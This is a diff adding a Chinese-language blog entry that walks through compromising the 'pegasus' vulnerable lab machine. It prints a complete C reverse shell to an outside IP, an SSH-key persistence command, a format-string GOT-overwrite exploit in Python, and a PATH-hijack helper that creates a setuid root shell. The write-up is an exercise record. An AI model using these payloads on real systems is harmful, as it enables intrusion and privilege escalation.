@@ -8333,6 +8333,169 @@
 ]]></content>
   </entry>
   <entry>
+    <title>pegasus</title>
+    <url>/2020/07/20/lgxkw7/</url>
+    <content><![CDATA[<p>扫描端口，web 服务开在了 8088</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595206330063-9931c990-b98b-4383-add5-9cbf8057ae8c.png#align=left&display=inline&height=452&margin=%5Bobject%20Object%5D&name=image.png&originHeight=680&originWidth=845&size=157017&status=done&style=none&width=561" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问啥都没有，扫描一下目录试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211576711-4038fd03-634d-4ab6-adae-659042dcaad7.png#align=left&display=inline&height=335&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=560&size=79124&status=done&style=none&width=392" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>/submit.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212186672-0cc3e254-7405-4b2a-9133-e49876ebfda2.png#align=left&display=inline&height=124&margin=%5Bobject%20Object%5D&name=image.png&originHeight=213&originWidth=560&size=21516&status=done&style=stroke&width=327" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>/codereview.php</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595211683436-9fa05675-3ddf-4659-8b11-79c8d5bfa726.png#align=left&display=inline&height=468&margin=%5Bobject%20Object%5D&name=image.png&originHeight=936&originWidth=1342&size=65200&status=done&style=stroke&width=671" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他是向 submit.php 发送代码的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595212386049-ecea2721-47b7-411b-ae41-0727c544b33b.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=1365&size=25845&status=done&style=stroke&width=682.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>他说他回去执行代码，但是我只试了 php 的，wp 说是 C 语言的，找了个 C 语言的 shell<br><a href="https://www.mi1k7ea.com/2019/03/24/C%25E7%25BC%2596%25E5%2586%2599%25E5%25AE%259E%25E7%258E%25B0Linux%25E5%258F%258D%25E5%25BC%25B9shell/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/03/24/C%E7%BC%96%E5%86%99%E5%AE%9E%E7%8E%B0Linux%E5%8F%8D%E5%BC%B9shell/</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> tcp_port = <span class="number">6666</span>;</span><br><span class="line"><span class="keyword">char</span> *ip = <span class="string">"192.168.149.1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        <span class="keyword">if</span> ( fork() &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">                addr.sin_family = AF_INET;</span><br><span class="line">                addr.sin_port = htons(tcp_port);</span><br><span class="line">                addr.sin_addr.s_addr = inet_addr(ip);</span><br><span class="line"></span><br><span class="line">                fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( <span class="built_in">connect</span>(fd, (struct sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) )&#123;</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                dup2(fd, <span class="number">0</span>);</span><br><span class="line">                dup2(fd, <span class="number">1</span>);</span><br><span class="line">                dup2(fd, <span class="number">2</span>);</span><br><span class="line">                execve(<span class="string">"/bin/bash"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        reverse_shell();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>连上来了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213247305-be334672-84bb-4ea1-9c20-d349ce1d040e.png#align=left&display=inline&height=449&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=813&size=294769&status=done&style=none&width=564" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>把 wsl 的公钥写到 .ssh/authorized_keys 方便一点</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyab46KTnUD6PBqNHweAB+SfDl36waT1RpkBUB3rcmP7QhRk4EOh0yShEmGCA2fev&#x2F;A&#x2F;9BY2LP2nd4EplGNYn14OgHONtXH74fSCqf0QZGMexQ9BkV5pHOTW+nGapxeaUTzyEkQQvDLnLm05Oqx6F9d5pfHIrbfQLBK7J0zY1BpkflT3I8pBzEdzLCWoG4Z62WGKQ0Q0ldm9NkRoEbZSOUxneazHiVa89mORtdtHXRr3nseLOyN17rJh6c2CF8ZtlLHIp12GOl0A6qm0eFW4KSJJvZCdxhX&#x2F;p83hfCclFw7dckX1n+Q45GjuUF&#x2F;ZE8IXmKRkwNDxOZalSgFjyYX+RlMr95Ruv8IaMk8tv5+Ut04cquKUgCn&#x2F;9ksLRyL7+fJFok1EEupo4ZjTx3DlBNdkSch3IPT1XVgZeapqUik7jt5DgeGmGKBF93kE9pLO+2+3l1KntdeZ3abJHXDWzX6&#x2F;mqRNtvMzdVik0jQGOjnGz1Yck0z9w8BK8BGtZ+917Kvns&#x3D; 1097179511@qq.com&quot; &gt; authorized_keys</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213445694-8042cf4e-1ce5-477f-9002-00144ba4c420.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=671&originWidth=1483&size=1122114&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>my_first 权限有 s，可以 suid 提权</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213592143-a2fe2676-4212-4d01-b837-1f13d3f14ba7.png#align=left&display=inline&height=244&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=665&size=267692&status=done&style=none&width=467" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>用 nc 把那个文件拷贝出来</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595213798347-60ebf781-a726-49f8-9b8a-72cce498e16b.png#align=left&display=inline&height=134&margin=%5Bobject%20Object%5D&name=image.png&originHeight=268&originWidth=980&size=333399&status=done&style=none&width=490" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>在计算功能这里有一个格式化字符串漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214336592-1887c5e8-2ebb-40cb-9a98-c017ce136c41.png#align=left&display=inline&height=434&margin=%5Bobject%20Object%5D&name=image.png&originHeight=761&originWidth=584&size=49693&status=done&style=none&width=333" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214311779-ffe3463c-5fe1-4524-b8d4-aaa5f3b36f9f.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=620&originWidth=790&size=43437&status=done&style=stroke&width=395" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以数出来，AAAA 是在第八个位置被 %p 解析</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214550983-73f6914c-c12e-4ec9-8432-9105bf78e3dc.png#align=left&display=inline&height=394&margin=%5Bobject%20Object%5D&name=image.png&originHeight=788&originWidth=1483&size=1327059&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>检查一下保护，没有 canary</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214822173-96013234-a2ca-4990-9edc-045bba1485ef.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=image.png&originHeight=173&originWidth=742&size=144555&status=done&style=none&width=371" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>靶机上 ASRL 是开着的</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595214860093-75b591b1-2218-4ea0-88bb-25450f6d9c51.png#align=left&display=inline&height=38&margin=%5Bobject%20Object%5D&name=image.png&originHeight=50&originWidth=675&size=44217&status=done&style=none&width=510" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以通过 ulimit -s unlimited 使得 ASLR 实际上没用</p>
+<p>然后通过把 printf 的 got 的地址改成 system 的 got 的地址来拿到 shell<br>printf 0x8049bfc<br>system 0x40069060</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= p32(addr)+p32(addr+<span class="number">2</span>)</span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>额，靶机没有 pwntools<br>稍改一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># selection #1</span></span><br><span class="line">payload += <span class="string">"1\n"</span> <span class="comment"># first number</span></span><br><span class="line">addr=<span class="number">0x8049bfc</span></span><br><span class="line">payload+= <span class="string">"\xfc\x9b\x04\x08"</span>+<span class="string">"\xfe\x9b\x04\x08"</span></span><br><span class="line">payload+= <span class="string">"%36952u%8$n"</span>+<span class="string">"%44966u%9$n"</span></span><br><span class="line"><span class="comment">#9060</span></span><br><span class="line"><span class="comment">#14406</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
+
+<p>在本地写个 <code>Selection:</code> 可执行程序，由 1.c 编译而来 <code>gcc -o &quot;Selection:&quot; exp.c</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"cp /bin/sh /tmp/john"</span>);</span><br><span class="line">    system(<span class="string">"chmod 4777 /tmp/john"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同时 <code>export PATH=$PATH:/home/mike</code><br>这时候 <code>python exp.py | ./my_first</code> 会在 /tmp 目录下生成 john</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595221708264-36721677-b43c-4037-8bbd-ac422b696be9.png#align=left&display=inline&height=131&margin=%5Bobject%20Object%5D&name=image.png&originHeight=155&originWidth=397&size=55478&status=done&style=none&width=336" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>还是把 wsl 的公钥复制上去</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1595221766319-05e9f712-fbec-4f43-9367-8d723df88648.png#align=left&display=inline&height=151&margin=%5Bobject%20Object%5D&name=image.png&originHeight=301&originWidth=1483&size=447970&status=done&style=none&width=741.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+]]></content>
+  </entry>
+  <entry>
     <title>智能合约常见漏洞</title>
     <url>/2020/04/27/moa35g/</url>
     <content><![CDATA[<h1 id="整型溢出漏洞"><a href="#整型溢出漏洞" class="headerlink" title="整型溢出漏洞"></a>整型溢出漏洞</h1><p>用书上的例子来介绍一下：<br>一个小朋友，他可以数着手指运算十以内的运算，比如 1+1=2，他可以用两个手指算出来，但是如果你问他 5+6 等于多少，他数完十个手指之后发现手指不够用了，就会把手指扳回来，说：结果为 1，对于小朋友来说，这个问题就超纲“溢出”了</p>
